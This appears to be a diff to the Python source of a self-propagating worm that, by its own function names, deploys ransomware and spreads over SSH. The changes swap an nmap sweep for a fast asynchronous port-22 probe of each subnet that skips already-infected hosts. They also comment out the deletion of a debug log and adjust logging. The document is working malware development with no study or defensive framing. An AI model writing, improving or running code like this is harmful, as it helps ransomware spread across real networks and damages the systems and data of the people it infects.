@@ -8,7 +8,7 @@ This worm does the following:
     used for the next propagation cycle.
 """
 
-import sys, os, base64, uuid, subprocess, threading, traceback, logging, codecs, re
+import sys, os, base64, uuid, socket, asyncio, subprocess, threading, traceback, logging, codecs, re
 from datetime import datetime
 from random import shuffle
 from concurrent.futures import ThreadPoolExecutor
@@ -189,11 +189,11 @@ def deploy_ransomware():
 def initiate_worm():
     """Perform scanning, infection, and mutation propagation."""
     # If ransomware note doesn't exist, perform ransom operation.
-    if not os.path.exists(f"{home_path}/openme.txt"):
+    if not os.path.isfile(f"{home_path}/openme.txt"):
         deploy_ransomware()
     # Remove the debug log file if present
-    if os.path.isfile("dmsg.log"):
-        os.remove("dmsg.log")
+    #if os.path.isfile("/tmp/dmsg.log"):
+    #    os.remove("/tmp/dmsg.log")
 
     logger.info("Scanning local interfaces")
     local_ips, possible_subnets = local_addresses()
@@ -296,23 +296,39 @@ def partition_subnet(subnet_list):
             new_subnet_list.append(subnet)
     return new_subnet_list
 
+async def async_is_host_up(ip, port=22, timeout=0.1):
+    """
+    Asynchronously attempts to open a TCP connection to the given IP and port.
+    Returns True if the connection succeeds (host is up), False otherwise.
+    """
+    try:
+        _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
+        writer.close()
+        await writer.wait_closed()
+        return True
+    except Exception:
+        return False
+
 def scan_network(subnet, local_address_list):
-    """Use nmap to find active hosts in a subnet that haven't been infected yet."""
-    attacked_ips = load_entries(INFECTED_LOG)
-    discovered_hosts = []
-    if allowed(subnet):
-        logger.info(f"Scanning subnet: {subnet}")
-        nm = nmap.PortScanner()
-        nm.scan(hosts=str(subnet), arguments='-sn -T insane')
-        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
-        for host, status in hosts_list:
-            if status == "up" and host not in local_address_list:
-                if host not in attacked_ips:
-                    discovered_hosts.append(host)
-                else:
-                    logger.info(f"Host {host} already infected. Skipping...")
-    else:
-        logger.info(f"Subnet {subnet} ignored.")
+    """
+    Scans the given subnet (an IPNetwork object) for active hosts that:
+      - Are up (TCP connection on the given port succeeds)
+      - Are not in the list of local addresses (local_address_list)
+      - Are not already listed in the INFECTED_LOG.
+    Returns a list of discovered host IP addresses (as strings).
+    """
+    attacked_ips = set(load_entries(INFECTED_LOG))
+    hosts = [str(ip) for ip in subnet.iter_hosts()]
+    local_str = set(str(ip) for ip in local_address_list)
+    candidate_hosts = [host for host in hosts if host not in attacked_ips and host not in local_str]
+
+    async def scan_candidates():
+        tasks = [async_is_host_up(host, port=22, timeout=0.1) for host in candidate_hosts]
+        results = await asyncio.gather(*tasks)
+        # Return only hosts where connection succeeded.
+        return [host for host, is_up in zip(candidate_hosts, results) if is_up]
+
+    discovered_hosts = asyncio.run(scan_candidates())
     return discovered_hosts
 
 def filter_allowed(address_list):
@@ -321,8 +337,8 @@ def filter_allowed(address_list):
 
 def allowed(address):
     """Check if an IP address is within allowed subnets and not blocked."""
-    for blocked in BLOCKED_SUBNETS:
-        if address in IPNetwork(blocked) or address == IPNetwork(blocked):
+    for blocked_subnet in BLOCKED_SUBNETS:
+        if address in IPNetwork(blocked_subnet) or address == IPNetwork(blocked_subnet):
             return False
     for allowed_subnet in ALLOWED_SUBNETS:
         if address in IPNetwork(allowed_subnet) or address == IPNetwork(allowed_subnet):
@@ -371,7 +387,7 @@ def connect_via_ssh(ip):
             except (AuthenticationException, BadHostKeyException):
                 logger.info("SSH authentication failed.")
             except (SSHException, EOFError) as e:
-                logger.info(f"SSH connection error on {ip}: {str(e)}")
+                logger.debug(f"SSH connection error on {ip}: {str(e)}")
             except Exception as e:
                 logger.info(f"SSH connection error on {ip}: {str(e)}")
                 return
